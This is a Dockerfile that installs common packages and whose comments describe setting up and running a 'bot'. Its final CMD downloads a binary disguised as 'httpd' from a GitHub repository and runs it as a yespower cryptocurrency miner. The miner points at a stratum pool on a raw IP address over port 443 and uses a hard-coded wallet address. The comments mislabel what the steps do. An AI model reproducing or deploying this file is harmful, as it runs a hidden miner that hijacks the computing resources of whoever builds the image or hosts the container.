FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr --timeout 120 -p c=SWAMP,mc=BELL/BUTK/GLT/SPRX/SWAMP/VHH
